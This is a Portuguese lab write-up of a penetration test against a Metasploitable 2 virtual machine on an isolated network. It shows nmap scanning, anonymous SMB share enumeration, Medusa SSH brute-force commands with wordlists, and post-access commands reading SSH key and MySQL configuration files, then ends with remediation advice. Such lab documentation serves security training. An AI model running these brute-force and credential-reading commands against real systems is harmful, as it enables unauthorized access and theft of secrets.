# Projeto de Brute Force
Medusa

# Laboratório Pentest: Enumeração SMB, Brute Force SSH e Pós-Exploração

Documentação de teste de intrusão realizado em ambiente de laboratório local e isolado utilizando máquinas virtuais. O foco do exercício foi mapear serviços expostos, enumerar compartilhamentos de rede, explorar credenciais fracas via força bruta e identificar arquivos sensíveis mal configurados após o acesso inicial.

## Ambiente

As máquinas foram configuradas em rede interna isolada (*Host-Only*) para restringir o tráfego ao ambiente de testes.

| Função | Sistema | IP |
| :--- | :--- | :--- |
| Atacante | Kali Linux | `192.168.56.101` |
| Alvo | Metasploitable 2 | `192.168.56.102` |

Ferramentas utilizadas: `nmap`, `smbclient`, `medusa` e `ssh`.

---

## 1. Reconhecimento e Enumeração

# Varredura de Serviços
Execução do Nmap para identificar portas abertas e versões dos serviços ativos no alvo:

```bash
nmap -sV -sC 192.168.56.102
```

Principais portas identificadas:
- `22/tcp`: OpenSSH
- `139/tcp` e `445/tcp`: Samba (SMB)
- `3306/tcp`: MySQL

# Enumeração SMB (`smbclient`)
Com o serviço Samba ativo, foi feita a listagem dos compartilhamentos disponíveis utilizando sessão nula (sem usuário/senha):

```bash
smbclient -L //192.168.56.102 -N
```

Após identificar o compartilhamento `/tmp` aberto, foi realizado o acesso para verificar os arquivos e as permissões de leitura/escrita:

```bash
smbclient //192.168.56.102/tmp -N
```

Comandos executados dentro do prompt SMB:

```text
smb: \> ls
smb: \> dir
```

O compartilhamento permitia login anônimo sem senha, expondo arquivos armazenados no diretório e permitindo a navegação direta.

---

# 2. Ataque de Força Bruta com Medusa

Para testar a segurança da autenticação no serviço SSH, foi executado um ataque de força bruta utilizando o Medusa com wordlists de usuários e senhas conhecidas.

Teste direcionado a um usuário específico:

```bash
medusa -h 192.168.56.102 -u msfadmin -P /usr/share/wordlists/passwords.txt -M ssh
```

Teste utilizando listas para usuários e senhas com 4 threads simultâneas:

```bash
medusa -h 192.168.56.102 -U /usr/share/wordlists/users.txt -P /usr/share/wordlists/passwords.txt -M ssh -t 4
```

Parâmetros:
- `-h`: IP do host alvo
- `-u` / `-U`: usuário único ou arquivo de lista de usuários
- `-P`: arquivo de wordlist de senhas
- `-M`: módulo do serviço (`ssh`)
- `-t`: quantidade de tentativas paralelas

O Medusa encontrou a credencial válida `msfadmin:msfadmin`, permitindo o acesso remoto ao servidor:

```bash
ssh msfadmin@192.168.56.102
```

---

# 3. Pós-Exploração e Arquivos Vulneráveis

Com o acesso ao sistema estabelecido, foram inspecionados diretórios de configuração e armazenamento para verificar falhas de permissão.

# Chaves SSH
Verificação dos arquivos e permissões nos diretórios do SSH:

```bash
ls -la ~/.ssh/
ls -la /etc/ssh/
```

Foram identificados arquivos de chave privada (`id_rsa`) e chaves autorizadas (`authorized_keys`) com permissões excessivas de leitura, permitindo que outros usuários locais visualizassem o conteúdo das chaves.

### Diretórios e Configurações do MySQL
Inspeção da pasta de dados e do arquivo de configuração do banco de dados:

```bash
ls -la /var/lib/mysql/
cat /etc/mysql/my.cnf
```

Os arquivos das bases de dados em `/var/lib/mysql/` e o arquivo `my.cnf` estavam acessíveis para leitura, além de o usuário `root` do MySQL estar configurado sem senha, permitindo acesso direto ao banco via terminal (`mysql -u root`).

---

# 4. Pontos de Correção

- **SSH:** Desabilitar autenticação por senha (`PasswordAuthentication no` no `sshd_config`), exigir uso de chaves criptográficas e implementar bloqueio de tentativas com `Fail2Ban`.
- **Permissões de Chaves:** Restringir o acesso às chaves privadas apenas ao proprietário (`chmod 700 ~/.ssh` e `chmod 600 ~/.ssh/id_rsa`).
- **Samba (SMB):** Desativar o acesso anônimo/guest no `smb.conf` e exigir autenticação válida para listagem e acesso aos compartilhamentos.
- **MySQL:** Definir senha forte para o usuário `root`, restringir o escopo de rede do serviço (`bind-address = 127.0.0.1`) e ajustar as permissões do diretório `/var/lib/mysql`.
